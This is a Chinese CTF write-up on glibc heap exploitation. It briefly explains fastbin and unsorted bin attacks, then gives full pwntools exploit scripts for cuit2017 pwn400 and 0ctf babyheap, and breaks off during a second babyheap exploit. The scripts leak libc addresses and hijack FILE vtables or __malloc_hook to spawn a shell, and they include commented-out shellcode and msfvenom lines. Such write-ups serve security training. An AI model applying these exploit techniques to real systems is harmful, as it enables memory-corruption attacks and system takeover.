    <content type="html"><![CDATA[<h3 id="涉及到的知识点"><a href="#涉及到的知识点" class="headerlink" title="涉及到的知识点"></a>涉及到的知识点</h3><p>1、fastbin attack</p><p>2、unsorted bin attack</p><p>3、malloc堆内存管理</p><a id="more"></a><h3 id="一些记录"><a href="#一些记录" class="headerlink" title="一些记录"></a>一些记录</h3><p>当我们用malloc申请一个0x20的空间的时候，glibc实际上给予了我们一个如下这样子的一个结构。</p><p>|head(0x8/0x10)|data(0x20)|</p><p><strong>注意：由于x84和x64的机器字长不一样，故其head头部大小也不一样，x86为0x8长度，x64为0x10长度。</strong></p><p>data区域是我们可以进行数据输入的区间，malloc返回的指针便是该区间的首地址，记作PTR</p><p>当我们free它的时候，它会判定是否与top chunk相邻，如果相邻，它将会与top chunk合并，如果不是的话，它会进一步判断自身大小是否满足fast bin的要求，fastbin的边界大小由 libc内的全局变量fast_max决定，不过x86下这个值为0x40，x64下位0x80，小于等于这个值的所有chunk，free后将有fast bin管理，如果该chunk可以重复free，我们则可以利用fast bin attack来实现<strong>有限制的地址写能力</strong>（<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a> ）。而如果边界的大小大于fastbin的边界大小，该chunk则会加入到unsorted bin中去，此时我们可以修改bk来实现unsorted attack （ <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c</a> ）如果free 一个small/large chunk 的时候，可以修改本chunk、前一个或后一个，small/large chunk的head and data，则可以进行double free攻击。（ <a href="http://www.hackdig.com/08/hack-25191.htm" target="_blank" rel="external">http://www.hackdig.com/08/hack-25191.htm</a>  ）</p><h3 id="cuit2017-pwn400"><a href="#cuit2017-pwn400" class="headerlink" title="cuit2017 pwn400"></a>cuit2017 pwn400</h3><p>题目可以从我github上下载。</p><p>hint：ubuntu 16.04</p><p>本题利用方式为：fast bin attack 覆盖name变量实现信息泄露。  overlap chunk attack 实现 hijack fsp attack，最终修改vtable至onegadget 或者system 实现get shell。</p><p>注意点：x64下面 0x220为vtable偏移量。x86么。。还没测ORZ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-27 21:28:47</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn400"</span></div><div class="line">remote_ip = <span class="string">"119.29.87.226"</span></div><div class="line">port =  <span class="number">50004</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,sec)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(name)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(sec)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(data1,data2)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"Y"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(data1)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(data2)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(size,title,advise)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"6"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(size))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(title)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(advise)</div><div class="line"></div><div class="line"><span class="comment">#save(0x28,"a"*0x28+p64(0x21),"a"*0x18)</span></div><div class="line"></div><div class="line">add(<span class="string">"a"</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)+<span class="string">"\n"</span>,<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line">dele()</div><div class="line">edit(str(<span class="number">0x6020c0</span>).rjust(<span class="number">7</span>,<span class="string">"0"</span>)+<span class="string">"\n"</span>)</div><div class="line">submit(<span class="string">"a"</span>*<span class="number">0x17</span>+<span class="string">"\x00\n"</span>,<span class="string">"a"</span>*<span class="number">0x8</span>+p64(elf.got[<span class="string">"alarm"</span>])+<span class="string">"\n"</span>)</div><div class="line"><span class="comment">##leak (- limit :(</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"9"</span>)</div><div class="line"></div><div class="line">alarm_addr = u64(ru(<span class="string">",You"</span>)[<span class="number">5</span>:<span class="number">-4</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">libc_base = alarm_addr-libc.symbols[<span class="string">"alarm"</span>]</div><div class="line">one_gadget = libc_base + <span class="number">0xf5e40</span></div><div class="line">bin_sh = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">system_addr = libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">##hijack fsp</span></div><div class="line">save(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">0x28</span>+p64(<span class="number">0x110</span>+<span class="number">0x231</span>+<span class="number">0x1010</span>),<span class="string">"aaa\n"</span>)</div><div class="line">ru(<span class="string">"te on "</span>)</div><div class="line">addr_1 = int(ru(<span class="string">")\n"</span>)[<span class="number">2</span>:<span class="number">-2</span>],<span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(p,"b*0x040111A\nc")</span></div><div class="line">payload  = <span class="number">0x1c</span>*p64(system_addr)</div><div class="line">payload +=<span class="string">"/\x80||/////bin/sh\x00"</span> <span class="comment">#start fsp</span></div><div class="line">payload +=<span class="number">0x16</span>*p64(addr_1)+p64(<span class="number">0</span>)+(<span class="number">0x47</span><span class="number">-0x19</span>)*p64(addr_1)+p64(addr_1)+<span class="string">"\n"</span></div><div class="line"></div><div class="line">save(<span class="number">0x380</span>,p64(system_addr)*<span class="number">4</span>+<span class="string">"\n"</span>,payload)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>似乎有个可以直接用来算偏移的C源码，妈妈再也不用担心我算不准偏移啦~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    fp=<span class="built_in">stderr</span>;</div><div class="line">    <span class="keyword">int</span> chain=&amp;(fp-&gt;_chain);</div><div class="line">    <span class="keyword">int</span> flags=&amp;(fp-&gt;_flags);</div><div class="line">    <span class="keyword">int</span> dis=chain-flags;</div><div class="line">  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FILE struct size: 0x%x\n"</span>,<span class="keyword">sizeof</span>(FILE));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;chain - fp: 0x%x %x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> mode=&amp;(fp-&gt;_mode);</div><div class="line">    dis=mode-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;mode - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_ptr=&amp;(fp-&gt;_IO_write_ptr);</div><div class="line">    dis=write_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_base=&amp;(fp-&gt;_IO_write_base);</div><div class="line">    dis=write_base-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_base - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> vtable_offset=&amp;(fp-&gt;_vtable_offset);</div><div class="line">    dis=vtable_offset-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;vtable_offset - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> read_ptr=&amp;(fp-&gt;_IO_read_ptr);</div><div class="line">    dis=read_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;read_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div></pre></td></tr></table></figure></p><h3 id="0ctf-baby-heap"><a href="#0ctf-baby-heap" class="headerlink" title="0ctf baby heap"></a>0ctf baby heap</h3><p>这题有两种利用方式，一种是全程使用fastbin attack ，还有一种是既利用fast bin 又利用 unsorted bin attack</p><p>exp1 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-22 10:39:31</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"x86_64"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./babyheap"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></div><div class="line">ru(<span class="string">"Command:"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"Size: "</span>)</div><div class="line">sl(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index,size,data)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line">ru(<span class="string">"Size: "</span>)</div><div class="line">sl(str(size))</div><div class="line">ru(<span class="string">"Content: "</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line"></div><div class="line">add(<span class="number">0x20</span>) <span class="comment">#index0</span></div><div class="line">add(<span class="number">0x1e0</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index2</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index3</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free index1</span></div><div class="line"></div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x28</span>+<span class="string">"\x30"</span></div><div class="line"></div><div class="line">fill(<span class="number">0</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#index4</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free 1</span></div><div class="line">free(<span class="number">2</span>) <span class="comment">#free 2</span></div><div class="line"></div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line"></div><div class="line">dump(<span class="number">4</span>)</div><div class="line"></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">libc_bin_addr = u64(p.recv(<span class="number">8</span>))</div><div class="line"><span class="comment"># bin_offset = 0x3a5678</span></div><div class="line">one_gadget_offset = <span class="number">0x4425a</span></div><div class="line">local_bin_offset = <span class="number">0x3C4C58</span></div><div class="line">libc_base = libc_bin_addr - local_bin_offset</div><div class="line">libc.address = libc_base</div><div class="line"></div><div class="line">one_gadget_addr = one_gadget_offset+libc_base</div><div class="line"></div><div class="line">malloc_offset = <span class="number">0x3C4BD0</span></div><div class="line">malloc_addr = malloc_offset + libc_base</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#change index 4 meta</span></div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>)</div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">free(<span class="number">4</span>)</div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>,libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"></div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></div><div class="line">payload = flat(<span class="string">"\x00"</span>*<span class="number">19</span>,one_gadget_addr)</div><div class="line">fill(<span class="number">4</span>,len(payload),payload)</div><div class="line">raw_input()</div><div class="line">add(<span class="number">0x90</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_bin_addr="</span>+hex(libc_bin_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"libc_base="</span>+hex(libc_base)</div><div class="line"><span class="keyword">print</span> <span class="string">"one_gadget_addr="</span>+hex(one_gadget_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"malloc_addr="</span>+hex(malloc_addr)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>exp2 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div 